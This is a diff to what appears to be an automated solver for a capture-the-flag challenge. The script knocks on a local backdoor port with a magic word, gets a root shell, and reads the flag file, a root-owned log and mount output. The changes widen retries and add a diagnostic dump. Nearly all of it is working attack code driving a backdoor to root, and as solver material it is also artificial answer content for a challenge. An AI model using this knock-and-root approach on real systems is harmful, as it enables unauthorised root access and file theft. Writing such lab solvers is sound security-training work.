@@ -89,11 +89,14 @@ def main():
         # knock: pipe the magic word + commands into the local backdoor port; the
         # flag materialises at boot, so retry the whole knock until it's the real one
         flag=""; uid0=False
-        for attempt in range(12):
+        for attempt in range(24):   # wide window: gen-flag can materialise minutes after telnetd
             # knock with the magic word, then send the post-knock commands as ONE
             # semicolon-separated line — telnet's CR handling mangles separate echo
             # lines over the raw socket (id alone -> ": not found"), one line works.
-            tn.sendline("( echo %s; sleep 2; echo 'id; cat %s/%s' ) "
+            # cat the flag via the backdoor shell, with a generous trailing sleep so
+            # the whole multi-line file relays back before the socket closes (proven
+            # by the diagnostic; grep failed — the inetd shell's PATH lacks /usr/bin).
+            tn.sendline("( echo %s; sleep 2; echo 'id; cat %s/%s'; sleep 5 ) "
                         "| telnet localhost %s 2>&1" % (BMAGIC, LOOTD, LOOTN, BPORT))
             tn.expect(r"BRIAN> ",timeout=90)
             body=tn.before
@@ -103,12 +106,21 @@ def main():
                 if "BU{" in line: f=line[line.index("BU{"):].split("}")[0]+"}"; break
             if f and f!=DECOY: flag=f; break
             log("attempt %d: knock gave %s"%(attempt+1, "decoy (flag not materialised)" if f==DECOY else "no root/flag yet"))
-            time.sleep(6)
+            time.sleep(9)
         if not uid0:
             log("BACKDOOR FAILED: never saw uid=0 from the in.pmd knock"); return 4
         log("backdoor OK: uid=0 root shell via in.pmd '%s' on port %s"%(BMAGIC,BPORT))
         if not flag:
-            log("FLAG FAILED: only decoy/none (gen-flag MFS?)"); return 6
+            log("FLAG FAILED: only decoy/none (gen-flag MFS?)")
+            tn.sendline("( echo %s; sleep 2; echo 'ls -la %s; echo ---FLAG---; "
+                        "cat %s/%s; echo ---LOG---; cat /root/.genflag.log; echo ---MNT---; "
+                        "mount | grep -i loot'; sleep 4 ) | telnet localhost %s 2>&1"
+                        % (BMAGIC, LOOTD, LOOTD, LOOTN, BPORT))
+            tn.expect(r"BRIAN> ",timeout=90)
+            for ln in tn.before.splitlines():
+                if ln.strip() and "telnet localhost" not in ln:
+                    log("diag: %s"%ln.strip())
+            return 6
         log("flag recovered: %s"%flag)
         if EXPECT and flag!=EXPECT: log("FLAG MISMATCH: got %s expected %s"%(flag,EXPECT)); return 7
         log("=== SOLVE OK: foothold -> find backdoor -> knock -> root -> flag ===")
